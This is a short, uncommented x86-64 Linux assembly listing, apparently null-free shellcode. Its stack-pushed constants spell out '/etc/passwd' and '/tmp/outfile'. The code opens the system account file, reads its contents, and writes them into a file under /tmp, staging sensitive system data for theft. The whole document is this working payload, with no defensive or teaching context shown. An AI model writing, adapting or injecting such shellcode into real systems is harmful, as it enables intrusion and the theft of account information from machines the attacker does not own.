global _start
section .text

_start:

        xor rax, rax
        mov al, 2
        xor rdi, rdi
        mov rbx, 0x647773
        push rbx
        mov rbx, 0x7361702f6374652f
        push rbx
        lea rdi, [rsp]
        xor rsi, rsi
        syscall
        mov rbx, rax
        xor rax, rax
        mov rdi, rbx
        mov rsi, rsp
        mov dx, 0xFFFF
        syscall
        mov r8, rax
        mov rax, rsp
        xor rbx, rbx
        push rbx
        mov rbx, 0x656c6966
        push rbx
        mov rbx, 0x74756f2f706d742f
        push rbx
        mov rbx, rax
        xor rax, rax
        mov al, 2
        lea rdi, [rsp]
        xor rsi, rsi
        push 0x66
        pop si
        syscall
        mov rdi, rax
        xor rax, rax
        mov al, 1
        lea rsi, [rbx]
        xor rdx, rdx
        mov rdx, r8
        syscall
